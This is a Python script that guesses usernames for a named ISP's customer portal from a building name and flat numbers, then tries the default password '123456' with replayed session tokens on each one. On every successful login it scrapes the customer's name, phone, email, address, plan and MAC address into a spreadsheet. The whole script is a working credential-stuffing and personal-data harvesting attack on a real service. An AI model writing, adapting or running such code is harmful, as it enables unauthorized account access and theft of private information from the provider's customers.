from math import floor
import requests, xlsxwriter, os
from bs4 import BeautifulSoup

building_name = input("Enter the name of the building:- ").lstrip().lower()
totalFloors = int(input("Enter total number of floors:- "))
flatsPerFloor = int(input("Enter number of flats per floor:- "))
total = flatsPerFloor * totalFloors
print(f"\n\nNumber of flats: {total}\n\nPlease Wait...")

width = 60
count = 0

user_list = {}

for i in range(1, totalFloors + 1):
    for x in range(1, flatsPerFloor + 1):

        username = f"{building_name}{i}0{x}"

        count += 1
        progress = float(count) / float(total)
        numberOfBars = int(floor(progress * float(width)))
        numberOfTicks = width - numberOfBars
        bars = "▓" * numberOfBars
        ticks = "░" * numberOfTicks
        percentage = int(floor(progress * 100))
        print(f"[{bars}{ticks}] {percentage}%", end="\r")

        r = requests.post(
            "https://customer.digitalsatellite.in/Customer/PortalLogin.aspx?h8=1",
            data={
                "ToolkitScriptManager1_HiddenField": ";;AjaxControlToolkit,+Version=4.1.60623.0,+Culture=neutral,+PublicKeyToken=28f01b0e84b6d53e:en-US:3a72dea3-4bbb-479b-8b97-903103ced56d:475a4ef5:effe2a26:751cdd15:5546a2b:dfad98a5:1d3ed089:497ef277:a43b07eb:d2e10b12:37e2e5c9:3cf12cf1",
                "__EVENTTARGET": "",
                "__EVENTARGUMENT": "",
                "__VIEWSTATE": "/wEPDwUKMTU3NjczMDMyMA8WAh4iQ3VzdG9tZXJFbmFibGVDYXB0Y2hhQWZ0ZXJBdHRlbXB0MWYWCgIBD2QWBmYPZBYCZg8WAh4EVGV4dGVkAgEPFgIfAQWHBzwhRE9DVFlQRSBodG1sPg0KPGh0bWwgbGFuZz0iZW4iPg0KPGhlYWQ+DQogIDx0aXRsZT5EaWdpdGFsIFNhdGVsbGl0ZSBMb2dpbiBDcmVkZW50aWFsczwvdGl0bGU+DQogIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4NCiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuLi9DbGllbnRzcGljaWZpYy9EaWdpdGFsIFNhdGVsaXRlL2Nzcy9sb2dpbi5jc3MiPg0KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii4uL2Nzcy9ib290c3RyYXAubWluLmNzcyI+DQogIDxzY3JpcHQgc3JjPSIuLi9qcy9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCiAgPHN0eWxlPg0KaW1nIHsNCiAgICBkaXNwbGF5OiBibG9jazsNCiAgICBoZWlnaHQ6IDEwMCU7DQp9DQpzcGFuI1RuQyB7DQogICAgZGlzcGxheTogbm9uZTsNCn0NCi5kaXYgLmZpcnN0IHsNCiAgICBvcGFjaXR5OiAwLjk7DQogICAgZmlsdGVyOiBhbHBoYShvcGFjaXR5PTUpOyAvKiBGb3IgSUU4IGFuZCBlYXJsaWVyICovDQp9DQoNCmJvZHksIGh0bWwgew0KICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiLi4vQ2xpZW50c3BpY2lmaWMvRGlnaXRhbCUyMFNhdGVsaXRlL2ltYWdlcy9PVFRCYW5uZXItMS5wbmciKTsNCiAgICBoZWlnaHQ6IDEwMCU7DQogICAgYmFja2dyb3VuZC1wb3NpdGlvbjogdG9wOw0KICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQ7DQogICAgYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCiAgICBtYXJnaW4tdG9wOiAwOw0KICAgIG1hcmdpbi1sZWZ0OiAwOw0KICAgIG1hcmdpbi1yaWdodDogMDsNCiAgICBtYXJnaW4tYm90dG9tOiAwOw0KfQ0KDQo8L3N0eWxlPg0KPC9oZWFkPmQCAg8WAh8BZWQCAw8WAh8BBYIEPGJvZHk+DQogIDxkaXYgY2xhc3M9ImZpcnN0Ij4NCjxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQo8ZGl2IGNsYXNzPSJjb2wtc20tNCI+DQo8ZGl2IGNsYXNzPSJjb2wtc20tNCI+PC9kaXY+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxicj4NCiAgPGJyPg0KICA8YnI+DQogIDxkaXYgY2xhc3M9InBhbmVsIHBhbmVsLWRlZmF1bHQiPg0KICAgICAgPGRpdiBjbGFzcz0icGFuZWwtaGVhZGluZyI+RGlnaXRhbCBTYXRlbGxpdGUgTG9naW4gQ3JlZGVudGlhbHM8L2Rpdj4gDQogICAgICA8ZGl2IGNsYXNzPSJwYW5lbC1ib2R5Ij4NCiAgICAgICAgPCEtLTxpbWcgc3JjPSJEaWdpdGFsX0ZpbmFsLnBuZyIgY2xhc3M9ImNlbnRlciIgYWx0PSJEaWdpdGFsIFNhdGVsbGl0ZSIgd2lkdGg9IjIyOCIgaGVpZ2h0PSIxNzciPi0tPmQCBQ9kFhYCBQ8WAh8BZWQCBw8WAh4HVmlzaWJsZWdkAgkPD2QWAh4Fc3R5bGVlZAIND2QWBAIBDxYCHwJnZAIDDw9kFgIfA2VkAhEPZBYEAgEPFgIfAmdkAgMPD2QWAh8DZWQCFw8QZGQWAQICZAIdDw9kFgIfA2VkAh8PD2QWAh8DZWQCIQ8WAh8BZWQCIw8WAh4FY2xhc3MFBmZvcmdvdGQCJQ8WAh8CaGQCBw8WAh8BBWI8L2Rpdj4NCiAgPC9kaXY+DQogICAgPC9kaXY+DQogICAgPGRpdiBjbGFzcz0iY29sLXNtLTQiPjwvZGl2Pg0KPC9kaXY+DQo8L2Rpdj4NCg0KPC9ib2R5Pg0KPC9odG1sPmQCCQ8WAh8CaGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFCWNoa1JlbWJlcmQlmgBvNSDj2rlLERrkegJ5pxTat0nUMQfGFfh5PUTi",
                "__VIEWSTATEGENERATOR": "9ED6BBB5",
                "__EVENTVALIDATION": "/wEdAA6Ux6r6kydxFLU46pVtuO2YY3plgk0YBAefRz3MyBlTcHY2+Mc6SrnAqio3oCKbxYYjCInvqtcGm8il+3aGUsAW7ZMbE1VTmxuM7T5jalU8cUq5fiMpYUTisam+OFD+B+i1N82k7PQIfi8qeAF/PEMhVma9a90npWFCrnQhrBpAVIryEXYa6oHUSQ8+d9EjQjPZDPKiUhVk39H+V9Aowtpb+Q1WB30fQ3LaO3Tvu7lxBWwAg2c4ulHYNJSb6bavDlyqCc1W4fbkY2rSDvI+toBF7mkABqcwFA9TAfI6FY79zm7XimMW7/K6ybS0nziEqSBXFlWTjCX8XPlZryDv0RFs",
                "txtUserName": username,
                "txtPassword": "123456",
                "hdnloginwith": "username",
                "save": "Log In",
                "txtForgetCapcha": "",
            },
        )
        if not BeautifulSoup(r.content, "html.parser").find(id="lblError"):
            resp = BeautifulSoup(
                requests.post(
                    "https://customer.digitalsatellite.in/Customer/Gauge.aspx",
                    headers={
                        "cookie": f"mIndex=0; __AntiXsrfToken={r.cookies.get_dict()['__AntiXsrfToken']}; ASP.NET_SessionId={r.history[0].cookies.get_dict()['ASP.NET_SessionId']}; SerL={r.history[0].cookies.get_dict()['SerL']}"
                    },
                ).content,
                "html.parser",
            )
            user_list[resp.find(id="lblName").text] = [
                username,
                int(resp.find(id="lblMobile").text),
                resp.find(id="lblEmail").text,
                resp.find(id="lblAddress").text,
                resp.find(id="lblValidityPeriod").text.split("Days")[0] + " Days",
                resp.find(id="lblPlanSpeed").text.split("Mbps")[0] + " Mbps",
                resp.find(id="lblCurrentUsage").text,
                resp.find(id="lblPlanName").text,
                resp.find(id="lblMacAddress").text,
                resp.find(id="lblUsageType").text,
                resp.find(id="lblExpiryDate").text,
            ]

workbook = xlsxwriter.Workbook(f"{building_name.capitalize()}.xlsx")
worksheet = workbook.add_worksheet("Data")
worksheet.set_default_row(25)

col = 0
for i in [
    "Name:",
    "Username:",
    "Mobile No:",
    "Email:",
    "Address:",
    "Validity:",
    "Speed:",
    "Usage:",
    "Plan Name:",
    "Mac Address:",
    "Plan Type:",
    "Expiry:",
]:
    worksheet.write(
        0,
        col,
        i,
        workbook.add_format(
            {"bold": True, "font_color": "black", "bg_color": "yellow", "font_size": 12}
        ),
    )
    col += 1

row = 1
for key in user_list:
    worksheet.write(row, 0, key)
    col = 1
    for i in user_list[key]:
        worksheet.write(row, col, i)
        col += 1
    row += 1

worksheet.set_row(0, 30)
worksheet.set_column(0, 0, 25)
worksheet.set_column(1, 1, 13)
worksheet.set_column(2, 2, 12)
worksheet.set_column(3, 3, 26)
worksheet.set_column(4, 4, 90)
worksheet.set_column(5, 5, 9)
worksheet.set_column(6, 6, 12)
worksheet.set_column(7, 7, 11)
worksheet.set_column(8, 8, 22)
worksheet.set_column(9, 9, 16)
worksheet.set_column(10, 10, 11)
worksheet.set_column(11, 11, 12)
workbook.close()
print(" " * 100 + f"\nOutput saved to {building_name.capitalize()}.xlsx\n")
os.system("pause")
